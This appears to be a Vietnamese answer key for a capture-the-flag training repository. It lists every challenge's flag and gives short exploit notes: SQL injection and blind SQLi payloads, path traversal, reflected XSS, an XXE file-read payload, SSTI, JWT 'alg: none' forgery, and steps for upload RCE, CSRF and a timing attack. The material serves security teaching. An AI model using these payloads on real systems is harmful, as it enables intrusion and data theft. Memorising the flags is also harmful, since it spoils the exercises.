# Tổng hợp nhanh Giải pháp các thử thách CTF

Tài liệu này là cuốn sổ tay tra cứu nhanh toàn bộ các thử thách CTF, các loại lỗ hổng tương ứng và Flag của chúng.

## Bảng tóm tắt thử thách

| # | Tên Thử thách | Loại lỗ hổng | Độ khó | Flag |
|---|-------|-------------------|-------------|------|
| 02 | LoginBypass | SQL Injection | Dễ | `FCTF{sql1_1s_0ld_but_g0ld}` |
| 03 | SecretNote | IDOR | Dễ | `FCTF{1d0r_1s_ev3rywh3r3}` |
| 04 | FileViewer | Path Traversal | Dễ | `FCTF{p4th_tr4v3rs4l_g0es_brrrr}` |
| 05 | CookieMonster | Thao túng Cookie | Dễ | `FCTF{c00k13s_4r3_n0t_s3cr3ts}` |
| 06 | GuestBook | XSS (Reflected) | Dễ | `FCTF{xss_st0l3_my_c00k13}` |
| 07 | HiddenAdmin | Parameter Tampering | Dễ | `FCTF{r0l3_param_byp4ss_ez}` |
| 08 | PriceTag | Thao túng giá | Dễ | `FCTF{pr1c3_t4mp3r1ng_ch34ts}` |
| 09 | RobotsSecret | Lộ lọt thông tin | Dễ | `FCTF{r0b0ts_l34k_s3cr3ts}` |
| 10 | ForgetMe | Đặt lại mật khẩu yếu | Trung bình | `FCTF{br0k3n_p4ssw0rd_r3s3t}` |
| 11 | JWTCafe | Khai thác thuật toán JWT None | Trung bình | `FCTF{jwt_n0n3_4lg_byp4ss}` |
| 12 | BlindSearch | Blind SQL Injection | Trung bình | `FCTF{bl1nd_sql1_1s_p4t13nt}` |
| 13 | UploadShell | RCE thông qua File Upload | Trung bình | `FCTF{f1l3_upl04d_byp4ss_rce}` |
| 14 | CSRFBank | Lỗ hổng CSRF | Trung bình | `FCTF{csrf_n0_t0k3n_n0_s3cur1ty}` |
| 15 | XXEReader | XXE Injection | Trung bình | `FCTF{xxe_r34ds_y0ur_f1l3s}` |
| 16 | RaceCondition| Lỗi tương tranh (Race Condition) | Khó | `FCTF{r4c3_c0nd1t10n_d0ubl3_sp3nd}` |
| 17 | SSTINote | Server-Side Template Injection | Trung bình | `FCTF{sst1_t3mpl4t3_1nj3ct10n}` |
| 18 | GraphAdmin | GraphQL IDOR | Trung bình | `FCTF{gr4phql_1d0r_n0_4uth}` |
| 19 | TimingOracle | Timing Attack | Khó | `FCTF{t1m1ng_4tt4ck_p4t13nc3}` |
| 20 | ChainPwn | Exploit Chain đa bước | Khó | `FCTF{ch41n_3xpl01t_m4st3r}` |
| 26 | IntegerOverflow | Tràn số nguyên | Dễ | `FCTF{1nt3g3r_0v3rfl0w_m4k3s_y0u_r1ch}` |
| 27 | UseAfterFree | Use-After-Free (UAF Heap) | Trung bình | `FCTF{u4f_d4ngl1ng_p01nt3r_1s_b4d}` |
| 28 | ROPChain | Return-Oriented Programming | Khó | `FCTF{r0p_ch41n_m4st3r_g4dg3ts}` |
| 29 | OffByOne | Stack Pivot (Poison Null Byte) | Trung bình | `FCTF{0ff_by_0n3_p1v0t_s74ck}` |
| 30 | Ret2Libc | Ret2Libc Bypass ASLR | Khó | `FCTF{r3t2l1bc_4slr_byp4ss_m4st3r}` |

---

## Chi tiết Exploit nhanh

### 02 - LoginBypass (SQLi)
**Payload:** `admin' OR '1'='1' --`  
**Flag:** `FCTF{sql1_1s_0ld_but_g0ld}`

### 03 - SecretNote (IDOR)
**URL mục tiêu:** `/note/3`  
**Account mồi:** bob / bob456  
**Flag:** `FCTF{1d0r_1s_ev3rywh3r3}`

### 04 - FileViewer (Path Traversal)
**URL:** `/?file=../secret/flag.txt`  
**Flag:** `FCTF{p4th_tr4v3rs4l_g0es_brrrr}`

### 05 - CookieMonster (Sửa Cookie)
**Hành động:** Mở DevTools, đổi cookie từ `role=guest` thành `role=admin`  
**Flag:** `FCTF{c00k13s_4r3_n0t_s3cr3ts}`

### 06 - GuestBook (XSS)
**Payload:** `?q=<script>alert(document.cookie)</script>`  
**Flag:** `FCTF{xss_st0l3_my_c00k13}`

### 07 - HiddenAdmin (Parameter Tampering)
**URL:** `/dashboard.jsp?role=admin`  
**Flag:** `FCTF{r0l3_param_byp4ss_ez}`

### 08 - PriceTag (Lỗi Logic)
**Hành động:** Inspect HTML, sửa thẻ input hidden từ `price=999.99` xuống `price=1.00`  
**Flag:** `FCTF{pr1c3_t4mp3r1ng_ch34ts}`

### 09 - RobotsSecret (Info Disclosure)
**Các bước:** Xem file `/robots.txt` → Lần mò theo đường dẫn `/user/1`  
**Flag:** `FCTF{r0b0ts_l34k_s3cr3ts}`

### 10 - ForgetMe (Thuật toán Reset Pass yếu)
**Logic của Token:** `tên user + "2024"`  
**Token để hack alice:** `alice2024`  
**Flag:** `FCTF{br0k3n_p4ssw0rd_r3s3t}`

### 11 - JWTCafe (JWT None Bypass)
**Hành động:** Lấy token của mình, vứt lên jwt.io, sửa Header thành `alg: "none"`, sửa Payload thành `role: "admin"`, xóa sạch phần Signature.  
**Flag:** `FCTF{jwt_n0n3_4lg_byp4ss}`

### 12 - BlindSearch (Blind SQLi)
**Payload dò chữ:** `' OR (SELECT SUBSTR(value,1,1) FROM secrets WHERE key='flag') = 'F' AND '1'='1`  
**Flag:** `FCTF{bl1nd_sql1_1s_p4t13nt}`

### 13 - UploadShell (RCE File Upload)
**Hành động:** Đổi đuôi file thành `exploit.php.jpg` hoặc chặn request bằng Burp để sửa Content-Type. Tải lên đoạn mã thực thi lệnh `cat /app/flag.txt`.  
**Flag:** `FCTF{f1l3_upl04d_byp4ss_rce}`

### 14 - CSRFBank (CSRF)
**Hành động:** Tạo một trang HTML mồi nhử chứa form ẩn, cấu hình tự động auto-submit (Dùng JS) gửi request chuyển tiền từ tài khoản Alice sang mình. Dụ Alice click.  
**Flag:** `FCTF{csrf_n0_t0k3n_n0_s3cur1ty}`

### 15 - XXEReader (XXE Injection)
**Payload:**
```xml
<?xml version="1.0"?>
<!DOCTYPE products [
  <!ENTITY xxe SYSTEM "file:///app/flag.txt">
]>
<products>
  <name>&xxe;</name>
</products>
```
**Flag:** `FCTF{xxe_r34ds_y0ur_f1l3s}`

### 16 - RaceCondition (Lỗi TOCTOU)
**Hành động:** Sử dụng Script Python mở Multi-threading để spam 10 request đổi thưởng cùng lúc trong 1 mili-giây. Bypass logic trừ tiền.  
**Flag:** `FCTF{r4c3_c0nd1t10n_d0ubl3_sp3nd}`

### 17 - SSTINote (SSTI)
**Payload:** `{{config['FLAG']}}`  
**Flag:** `FCTF{sst1_t3mpl4t3_1nj3ct10n}`

### 18 - GraphAdmin (GraphQL IDOR)
**Payload Query:** `{ user(id: 1) { id username role email secret } }`  
**Account mồi:** bob / bob123
**Flag:** `FCTF{gr4phql_1d0r_n0_4uth}`

### 19 - TimingOracle (Timing Attack)
**Hành động:** Gửi từng ký tự lên server. Đo độ trễ (Latency). Ký tự nào phản hồi mất nhiều thời gian hơn (VD: 50ms) thì đó là ký tự đúng. Lặp lại cho tới khi mò được hết `deadbeef42`.  
**Flag:** `FCTF{t1m1ng_4tt4ck_p4t13nc3}`

### 20 - ChainPwn (Exploit Chain)
**Hành động:** 
1. Dùng SQLi `admin' --` để cướp quyền đăng nhập admin.
2. Lấy JWT sinh ra trên dashboard.
3. Chèn JWT vừa lấy vào URL để khai thác API bị lỗi IDOR: `/api/flag?uid=1&token=[JWT]`  
**Flag:** `FCTF{ch41n_3xpl01t_m4st3r}`

---

## Phân loại lỗ hổng theo chủ đề

### Các đòn tấn công Injection (Tiêm chích)
- **02 - LoginBypass:** SQL Injection
- **12 - BlindSearch:** Blind SQLi
- **15 - XXEReader:** XXE Injection

### Xác thực & Phiên lỏng lẻo
- **05 - CookieMonster:** Lưu trữ thông tin phân quyền dưới dạng Plaintext ở Cookie
- **10 - ForgetMe:** Logic gen mã Reset Password quá dễ đoán
- **11 - JWTCafe:** JWT Algorithm Confusion (Lỗ hổng "alg: none")

### Kiểm soát truy cập (Access Control)
- **03 - SecretNote:** Lỗi IDOR cổ điển
- **07 - HiddenAdmin:** Parameter Tampering
- **09 - RobotsSecret:** Lộ thông tin nhạy cảm (Info Disclosure)

### Lỗi thiết kế & Cấu hình
- **04 - FileViewer:** Path Traversal
- **08 - PriceTag:** Lỗi Client-side Trust (Tin tưởng dữ liệu từ client)

### Các lỗ hổng Web khác
- **06 - GuestBook:** Reflected XSS
- **14 - CSRFBank:** CSRF

### Tấn công RCE & Lỗ hổng nâng cao
- **13 - UploadShell:** Bypass bộ lọc upload file dẫn đến Web Shell RCE
- **16 - RaceCondition:** Khai thác Time-Of-Check to Time-Of-Use (TOCTOU)
- **17 - SSTINote:** Server-Side Template Injection (Jinja2)
- **18 - GraphAdmin:** Bỏ qua ủy quyền GraphQL
- **19 - TimingOracle:** Side-Channel Attack (Tấn công qua kênh thời gian)
- **20 - ChainPwn:** Kỹ thuật nối chuỗi (Exploit Chain) đa lỗ hổng

### Các kỹ thuật Pwn (Khai thác nhị phân & bộ nhớ)
- **26 - IntegerOverflow:** Lỗi tràn số nguyên phá vỡ logic tính tiền
- **27 - UseAfterFree:** Lỗi Dangling Pointer trên Heap gây Type Confusion
- **28 - ROPChain:** Tràn bộ đệm Stack để thực thi chuỗi ROP (Return-Oriented Programming)
- **29 - OffByOne:** Stack Pivot thông qua lỗi Poison Null Byte (Tràn 1 byte null)
- **30 - Ret2Libc:** Vượt rào ASLR bằng cách Leak địa chỉ Base của thư viện libc

---

## Công cụ "Hành nghề" khuyến nghị

- **Burp Suite:** Để chặn (intercept), soi và sửa đổi bất kỳ Request HTTP nào.
- **Chrome/Firefox DevTools (F12):** Chỉnh sửa nhanh HTML, thao túng Cookie, xem console.
- **cURL:** Gửi request linh hoạt ngay từ Terminal.
- **Python (Requests + Pwntools):** Lên kịch bản tự động hóa hoặc nã đạn (Exploit) cho các bài Pwn/Race Condition.
- **jwt.io:** Phân tích, sửa chữa và giả mạo token JWT một cách trực quan.
- **SQLMap:** Thử nghiệm tự động chọc ngoáy Database (Chỉ dùng cho giáo dục, cố gắng làm bằng tay trước).

---

## Nguồn tài liệu tra cứu (Learning Resources)

### Tiêu chuẩn vàng: OWASP Top 10
Mọi thử thách trong kho lưu trữ này đều được đối chiếu theo bảng phân loại kinh điển OWASP Top 10:
- A01: Broken Access Control (IDOR, Parameter Tampering)
- A02: Cryptographic Failures (Lưu trữ plaintext, JWT yếu)
- A03: Injection (SQLi, XXE, XSS)
- A04: Insecure Design (Lỗi Logic, Race Condition)
- A05: Security Misconfiguration (Lộ thư mục, Lộ robots.txt)
- A07: Identification and Auth Failures (Lỗi đăng nhập, Quên pass)
- A08: Software and Data Integrity Failures (Lỗi Upload)

### Các sân chơi luyện tập khác
- PortSwigger Web Security Academy (Tuyệt vời cho Web)
- HackTheBox (Đỉnh cao của Pwn và Web)
- TryHackMe (Nền tảng thân thiện cho người mới bắt đầu)
- PentesterLab
- OWASP WebGoat

---

## Hướng dẫn sử dụng file

Mỗi thử thách đều đi kèm với một file `SOLUTION.md` giải thích cặn kẽ mọi thứ trong thư mục tương ứng:
- `02-LoginBypass/SOLUTION.md`
- `03-SecretNote/SOLUTION.md`
... *(Và các file khác)*

Trong mỗi file giải pháp, bạn sẽ tìm thấy:
- Phân tích chi tiết tại sao mã nguồn lại bị lỗi.
- Hướng dẫn khai thác từng bước một (Step-by-step).
- Các Script tự động (Python/Bash) hoặc Payload thô để bạn dễ hình dung.
- Các chiến lược giảm thiểu (Mitigation) để phòng tránh lỗ hổng đó ngoài đời thực.

---

**Chúc bạn hack vui vẻ! 🚩**
